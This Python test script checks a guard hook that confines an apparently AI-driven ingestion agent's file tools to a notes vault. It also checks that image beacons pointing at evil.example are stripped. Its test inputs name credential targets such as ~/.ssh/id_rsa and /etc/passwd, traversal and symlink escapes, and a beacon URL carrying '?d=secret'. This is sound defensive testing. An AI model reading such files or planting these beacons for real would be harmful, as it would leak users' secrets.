#!/usr/bin/env python3
"""Checks the PreToolUse guard denies what it must. Run it directly: python3 scripts/test_ingest_path_guard.py"""
import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

GUARD = Path(__file__).parent / "ingest-path-guard.py"


def call(tool_input, roots, tool="Read", write=()):
    """Returns the permissionDecision, or None when the guard stayed silent (allow).
    write: the write roots, passed as the guard's arguments the way guard_settings() does."""
    env = {**os.environ, "REKALL_GUARD_ROOTS": os.pathsep.join(str(r) for r in roots)}
    if roots is None:
        env.pop("REKALL_GUARD_ROOTS", None)
    out = subprocess.run(
        [sys.executable, str(GUARD), *map(str, write)],
        input=json.dumps({"tool_name": tool, "tool_input": tool_input}),
        capture_output=True, text=True, env=env,
    )
    assert out.returncode == 0, f"guard must exit 0, got {out.returncode}: {out.stderr}"
    if not out.stdout.strip():
        return None
    return json.loads(out.stdout)["hookSpecificOutput"]["permissionDecision"]


def main():
    with tempfile.TemporaryDirectory() as tmp:
        vault = Path(tmp) / "vault"
        (vault / "wiki").mkdir(parents=True)
        inside = vault / "wiki" / "note.md"
        inside.write_text("x")
        roots = [vault]

        assert call({"file_path": str(inside)}, roots) is None, "a file in the vault must be allowed"
        assert call({"file_path": str(vault)}, roots) is None, "the root itself must be allowed"
        assert call({"file_path": str(Path.home() / ".ssh" / "id_rsa")}, roots) == "deny", "~/.ssh must be denied"
        assert call({"file_path": "/etc/passwd"}, roots) == "deny", "/etc must be denied"
        assert call({"file_path": str(vault) + "/../secret.env"}, roots) == "deny", "traversal out must be denied"

        # A symlink planted inside the vault must not become a way out of it.
        link = vault / "wiki" / "escape"
        link.symlink_to(Path(tmp) / "outside.txt")
        (Path(tmp) / "outside.txt").write_text("secret")
        assert call({"file_path": str(link)}, roots) == "deny", "symlink out of the vault must be denied"

        # Grep and Glob carry their path under `path`, and Write/Edit under `file_path`.
        assert call({"path": "/etc"}, roots, tool="Grep") == "deny", "Grep outside must be denied"
        assert call({"path": str(vault)}, roots, tool="Glob") is None, "Glob inside must be allowed"
        assert call({"file_path": "/tmp/evil.md"}, roots, tool="Write") == "deny", "Write outside must be denied"

        # A tool input with no path at all is not the guard's business.
        assert call({"pattern": "TODO"}, roots, tool="Grep") is None, "a pathless call must pass through"

        # Misconfiguration fails closed rather than open.
        assert call({"file_path": str(inside)}, []) == "deny", "an empty allowlist must deny"

        # A second root is honored, since ingest also reads the wiki skill.
        other = Path(tmp) / "skills"
        other.mkdir()
        assert call({"file_path": str(other / "SKILL.md")}, [vault, other]) is None, "a second root must be allowed"

        # Write/Edit only under VAULT/wiki, never CLAUDE.md, never a dot path; other roots read-only.
        roots2, wiki = [vault, other], [vault / "wiki"]
        plugin = vault / ".obsidian" / "plugins" / "x" / "main.js"
        assert call({"file_path": str(plugin)}, roots2, tool="Write", write=wiki) == "deny", ".obsidian plugin write must be denied"
        assert call({"file_path": str(plugin)}, roots2, tool="Read", write=wiki) == "deny", "dot paths are denied for reads too"
        assert call({"file_path": str(vault / ".claude" / "settings.json")}, roots2, tool="Edit", write=wiki) == "deny"
        assert call({"file_path": str(vault / "wiki" / "CLAUDE.md")}, roots2, tool="Write", write=wiki) == "deny", "wiki/CLAUDE.md write must be denied"
        assert call({"file_path": str(vault / "wiki" / "CLAUDE.md")}, roots2, tool="Edit", write=wiki) == "deny", "wiki/CLAUDE.md edit must be denied"
        assert call({"file_path": str(vault / "wiki" / "CLAUDE.md")}, roots2, tool="Read", write=wiki) is None, "reading wiki/CLAUDE.md must be allowed"
        assert call({"file_path": str(vault / "wiki" / "pages" / "x.md")}, roots2, tool="Write", write=wiki) is None, "a wiki page write must be allowed"
        assert call({"file_path": str(vault / "notes.md")}, roots2, tool="Write", write=wiki) == "deny", "a vault write outside wiki/ must be denied"
        assert call({"file_path": str(other / "SKILL.md")}, roots2, tool="Write", write=wiki) == "deny", "the skill root must be read-only"
        assert call({"file_path": str(other / "SKILL.md")}, roots2, tool="Read", write=wiki) is None, "reading the skill root must be allowed"
        assert call({"file_path": str(inside)}, roots2, tool="Write") == "deny", "no write roots means no writes"

    check_settings()
    print("ingest path guard: all checks pass")


def check_settings():
    """The pipeline's own guard_settings() must produce settings that name this guard."""
    import importlib.util
    import tempfile as _tf
    root = Path(__file__).resolve().parents[1]
    with _tf.TemporaryDirectory() as tmp:
        vault = Path(tmp) / "vault"
        (vault / "wiki").mkdir(parents=True)
        cfg = Path(tmp) / "rekall.toml"
        cfg.write_text(
            '[user]\nname = "T"\ntimezone = "America/Chicago"\n'
            f'[vault]\npath = "{vault}"\n'
            f'[data]\npath = "{tmp}/data"\nstate = "{tmp}/state"\n'
            '[wiki]\narchive = "archive"\n[monday]\nboard = 0\ngroup = "Auto-Capture"\n')
        os.environ["REKALL_CONFIG"] = str(cfg)
        sys.path.insert(0, str(root))
        spec = importlib.util.spec_from_file_location("_fp", root / "scripts" / "fathom-pipeline.py")
        fp = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(fp)

        settings, roots = fp.guard_settings()
        hook = json.loads(settings)["hooks"]["PreToolUse"][0]
        for tool in ("Read", "Glob", "Grep", "Write", "Edit"):
            assert tool in hook["matcher"], f"{tool} must be matched by the guard hook"
        assert "ingest-path-guard.py" in hook["hooks"][0]["command"], "the hook must invoke this guard"
        assert str(vault) in roots, "the vault must be an allowed root"
        assert ".claude/skills/wiki" in roots or "skills/wiki" in roots, \
            "the wiki skill dir must be an allowed root; ingest is told to read it"
        assert f'"{vault / "wiki"}"' in hook["hooks"][0]["command"], "VAULT/wiki must be the only write root"

        check_strip_images(fp, vault)


def check_strip_images(fp, vault):
    """Remote images in a page the run touched are stripped; local embeds and old pages stay."""
    import time
    page = vault / "wiki" / "pages" / "p.md"
    page.parent.mkdir(parents=True, exist_ok=True)
    old = vault / "wiki" / "old.md"
    old.write_text("![x](https://evil.example/old.png)\n")
    os.utime(old, (time.time() - 3600,) * 2)
    page.write_text("# P\n\nKeep ![[local.png]] and ![l](assets/a.png).\n"
                    "![beacon](https://evil.example/?d=secret)\n"
                    "<img src=\"http://evil.example/x.gif\" width=1>\n"
                    "<IMG alt=y SRC='//evil.example/y'>\n"
                    "A [link](https://example.com) is not an image.\n")
    fp.strip_remote_images(time.time() - 60)
    text = page.read_text()
    assert "evil" not in text, f"remote images must be stripped: {text}"
    assert "![[local.png]]" in text and "![l](assets/a.png)" in text, "local embeds must stay"
    assert "[link](https://example.com)" in text, "plain links must stay"
    assert "evil" in old.read_text(), "pages the run didn't touch are left alone"


if __name__ == "__main__":
    main()
